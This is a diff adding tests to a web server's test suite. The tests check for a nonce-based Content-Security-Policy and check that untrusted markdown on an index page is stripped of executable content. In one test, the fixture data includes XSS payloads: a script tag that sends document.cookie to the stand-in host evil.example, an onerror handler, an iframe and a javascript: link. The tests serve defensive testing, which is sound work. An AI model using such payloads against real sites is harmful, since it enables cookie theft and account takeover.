@@ -449,8 +449,20 @@ describe("the pages and the pictures", () => {
 
     // The attribute lands in <head>, before anything is painted.
     const head = html.slice(0, html.indexOf("</head>"));
-    assert.match(head, /<script>/, "a reader who chose dark must not see a flash");
+    assert.match(head, /<script nonce=/, "a reader who chose dark must not see a flash");
     assert.match(head, /dataset\.theme/);
+  });
+
+  it("runs its own script by nonce, and nothing else at all", async () => {
+    const response = await fetch(`${harness.url}/c/${id}`);
+    const html = await response.text();
+    const policy = response.headers.get("content-security-policy") ?? "";
+
+    const nonce = /<script nonce="([^"]+)"/.exec(html)?.[1];
+    assert.ok(nonce !== undefined, "the page signs its own script");
+    assert.match(policy, new RegExp(`script-src 'nonce-${nonce.replace(/[+/=]/g, "\\$&")}'`));
+    assert.match(policy, /default-src 'none'/);
+    assert.doesNotMatch(policy, /unsafe-inline[^;]*script|script[^;]*unsafe-inline/);
   });
 
   it("serves the hero as an SVG at /c/{id}.svg, with its render as the etag", async () => {
@@ -685,6 +697,57 @@ describe("a mounted index page", () => {
     assert.equal(response.status, 200, "an index page is not worth a 500");
     assert.match(await response.text(), /Still here/);
     await write("# Still here\n");
+  });
+
+  it("drops anything in the file that could execute", async () => {
+    await write(
+      [
+        "# Ours",
+        "",
+        "<script>fetch('https://evil.example/' + document.cookie)</script>",
+        "",
+        '<img src="x" onerror="alert(1)">',
+        "",
+        '<iframe src="https://evil.example"></iframe>',
+        "",
+        "[a link](javascript:alert(1))",
+        "",
+        "<p>but the prose survives</p>",
+        "",
+        '<details><summary>and so does <b>this</b></summary>kept</details>',
+      ].join("\n"),
+    );
+    const html = await (await fetch(harness.url + "/")).text();
+    // The operator's part of the page only: the shell's own script sits after it.
+    const body = html.slice(
+      html.indexOf('class="narrow prose"'),
+      html.indexOf("</main>"),
+    );
+
+    assert.doesNotMatch(body, /<script/i, "a script in the file is gone");
+    assert.doesNotMatch(body, /evil\.example/, "and so is what it was going to do");
+    assert.doesNotMatch(body, /onerror/i);
+    assert.doesNotMatch(body, /<iframe/i);
+    assert.doesNotMatch(body, /javascript:/i);
+
+    // The HTML that cannot execute is left exactly as it was written.
+    assert.match(body, /<p>but the prose survives<\/p>/);
+    assert.match(body, /<details><summary>and so does <b>this<\/b><\/summary>kept<\/details>/);
+    assert.match(body, /<img src="x">/, "the element stays, the handler does not");
+    assert.match(body, /a link/, "the link's words stay, the scheme does not");
+  });
+
+  it("could not run one anyway, since the policy names only this server's", async () => {
+    await write("# Ours\n\n<script>alert(1)</script>\n");
+    const response = await fetch(harness.url + "/");
+    const policy = response.headers.get("content-security-policy") ?? "";
+    const nonce = /<script nonce="([^"]+)"/.exec(await response.text())?.[1];
+
+    assert.ok(nonce !== undefined);
+    assert.match(policy, new RegExp(`script-src 'nonce-${nonce.replace(/[+/=]/g, "\\$&")}'`));
+    // Somebody else's page may show somebody else's pictures, which is not the
+    // same freedom as running somebody else's code.
+    assert.match(policy, /img-src \* data:/);
   });
 
   it("refuses to start when the file was never there", async () => {
